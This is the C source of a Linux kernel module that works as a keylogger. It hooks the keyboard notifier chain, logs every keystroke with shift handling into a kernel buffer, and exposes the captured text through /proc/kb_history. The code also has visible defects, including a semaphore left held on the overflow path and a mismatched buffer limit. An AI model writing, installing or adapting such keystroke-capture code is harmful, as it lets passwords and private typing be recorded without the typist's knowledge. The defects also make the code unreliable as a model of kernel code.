#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <asm/current.h>
#include <linux/sched.h>
#include <generated/utsrelease.h>
#include <linux/version.h>
#include <linux/cred.h>
#include <linux/keyboard.h>
#include <linux/semaphore.h>

#define SUCCESS 0
#define DEVICE_NAME "kb_history"


struct semaphore sem;

static const char* keys[] = { "\0", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "BACKSPACE", "TAB",
	"q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "SPACE", "SPACE", "ENTER", "CTRL", "a", "s", "d", "f",
	"g", "h", "j", "k", "l", ";", "'", "`", "SHIFT", "\\", "z", "x", "c", "v", "b", "n", "m", ",", ".",
	"/", "SHIFT", "\0", "\0", "SPACE", "CAPSLOCK", "F1", "F2", "F3", "F4", "F5", "F6", "F7",
	"F8", "F9", "F10", "NUMLOCK", "SCROLLLOCK", "HOME", "UP", "PGUP", "-", "LEFT", "5",
	"RTARROW", "+", "END", "DOWN", "PGDN", "INS", "DELETE", "\0", "\0", "\0", "F11", "F12",
	"\0", "\0", "\0", "\0", "\0", "\0", "\0", "ENTER", "CTRL", "/", "PRTSCR", "ALT", "\0", "HOME",
	"UP", "PGUP", "LEFT", "RIGHT", "END", "DOWN", "PGDN", "INSERT", "DEL", "\0", "\0",
	"\0", "\0", "\0", "\0", "\0", "PAUSE"
	};

static const char* shift_keys[] ={ "\0", "ESC", "!", "@", "#", "$", "%", "^", "&", "*", "(", ")", "_", "+", "BACKSPACE", "TAB",
	"Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "{", "}", "ENTER", "CTRL", "A", "S", "D", "F",
	"G", "H", "J", "K", "L", ":", "\"", "~", "SHIFT", "|", "Z", "X", "C", "V", "B", "N", "M", "<", ">",
	"?", "SHIFT", "\0", "\0", "SPACE", "CAPSLOCK", "F1", "F2", "F3", "F4", "F5", "F6", "F7",
	"F8", "F9", "F10", "NUMLOCK", "SCROLLLOCK", "HOME", "UP", "PGUP", "-", "LEFT", "5",
	"RTARROW", "+", "END", "DOWN", "PGDN", "INS", "DELETE", "\0", "\0", "\0", "F11", "F12",
	"\0", "\0", "\0", "\0", "\0", "\0", "\0", "ENTER", "CTRL", "/", "PRTSCR", "ALT", "\0", "HOME",
	"UP", "PGUP", "LEFT", "RIGHT", "END", "DOWN", "PGDN", "INSERT", "DEL", "\0", "\0",
	"\0", "\0", "\0", "\0", "\0", "PAUSE"
	};

static struct proc_dir_entry* our_proc_file;
static int shift_key_flag = 0;
static char buffer[4096];
static int i = 0, j = 0;
static int error = 0;
int keyboard_notify( struct notifier_block *nblock, unsigned long code, void *_param ){
	struct keyboard_notifier_param *param = _param;


	if(code == KBD_KEYCODE){
		if( param->value==42 || param->value==54 ){
			down(&sem);
			if(param->down)
				shift_key_flag = 1;
			else
				shift_key_flag = 0;
			up(&sem);
			return NOTIFY_DONE;
		}

		if(param->down){
			down(&sem);
			if(shift_key_flag == 0 && i<1024)
				strcat(buffer, keys[param->value]);
			else if(shift_key_flag == 1 && i<1024)
				strcat(buffer, shift_keys[param->value]);
			else{
				printk(KERN_INFO "SIMPLEKEYBOARDNOFIFIER: Buffer Overflow\n");
				for(j=0; j<i; buffer[j++]=NULL);
				i = 0;
				return NOTIFY_OK;
				}
			
			i = strlen(buffer);
			up(&sem);
			return NOTIFY_OK;
		}
	}
	return NOTIFY_OK;
}

static struct notifier_block keyboard_nb ={
	.notifier_call = keyboard_notify, 
};


static int proc_show(struct seq_file *m, void *v){
	printk(KERN_INFO "SIMPLEKEYBOARDNOFIFIER: Generating output for user space with seq_files.\n");
	seq_printf(m, "%s \n",buffer);
	return SUCCESS;
}

static int proc_open(struct inode *inode, struct file *file){
	printk(KERN_INFO "SIMPLEKEYBOARDNOFIFIER: Open Function, Process \"%s:%i\"\n", current->comm, current->pid);
	printk(KERN_INFO "SIMPLEKEYBOARDNOFIFIER: Open Function, USER \"UID:%i\"\n", get_current_user()->uid.val);
	return single_open(file, proc_show, NULL);
}


static int module_permission(struct inode *inode, int operation){
	printk(KERN_INFO "SIMPLEKEYBOARDNOFIFIER: Permission Function, USER \"UID:%i\"\n", get_current_user()->uid.val);

	if(operation == 4 || (operation == 2 && get_current_user()->uid.val == 0))
		return 0;

	return -EACCES;
}


static const struct file_operations fops = {
	.owner = THIS_MODULE,
	.open = proc_open,
	.read = seq_read,
	.llseek = seq_lseek,
	.release = single_release,
};

static const struct inode_operations iops = {
	.permission = module_permission,
};


static int __init SIMPLEKEYBOARDNOFIFIER_init(void){

	printk(KERN_INFO "SIMPLEKEYBOARDNOFIFIER: Initialization.\n");
	printk(KERN_INFO "SIMPLEKEYBOARDNOFIFIER: Init Module, Process \"%s:%i\"\n", current->comm, current->pid);


	#if LINUX_VERSION_CODE <= KERNEL_VERSION(2, 6, 10)
		printk(KERN_INFO "SIMPLEKEYBOARDNOFIFIER: Hello OLD Kernel %s, So Use create_proc_entry Function\n", UTS_RELEASE);
		our_proc_file = create_proc_entry(DEVICE_NAME, 0644 , NULL);
		our_proc_file->proc_fops = &fops;
		our_proc_file->proc_iops = &iops;
	#else

		printk(KERN_INFO "SIMPLEKEYBOARDNOFIFIER: Hello NEW Kernel %s, So Use proc_create Function\n", UTS_RELEASE);
		our_proc_file = proc_create(DEVICE_NAME, 0644 , NULL, &fops);

	#endif

	if(!our_proc_file){
		printk(KERN_ALERT "SIMPLEKEYBOARDNOFIFIER: Registration Failure.\n");

		return -ENOMEM;
	}
	error = register_keyboard_notifier(&keyboard_nb);
	if(error){
		printk(KERN_ALERT "SIMPLEKEYBOARDNOFIFIER: Error in registering keyboard notifier\n");
		return error;
		}
	printk(KERN_INFO "SIMPLEKEYBOARDNOFIFIER: Keyboard notifier registered successfully\n");

	sema_init(&sem, 1);

	printk(KERN_INFO "SIMPLEKEYBOARDNOFIFIER: /proc/%s has been created.\n", DEVICE_NAME);
	return SUCCESS;
}

static void __exit SIMPLEKEYBOARDNOFIFIER_exit(void){
	unregister_keyboard_notifier(&keyboard_nb);
	printk(KERN_INFO "SIMPLEKEYBOARDNOFIFIER: Cleanup Module, Process \"%s:%i\"\n", current->comm, current->pid);

	remove_proc_entry(DEVICE_NAME, NULL);
	printk(KERN_INFO "SIMPLEKEYBOARDNOFIFIER: /proc/%s has been removed.\n", DEVICE_NAME);
	printk(KERN_INFO "SIMPLEKEYBOARDNOFIFIER: GoodBye.\n");
}

module_init(SIMPLEKEYBOARDNOFIFIER_init);
module_exit(SIMPLEKEYBOARDNOFIFIER_exit);
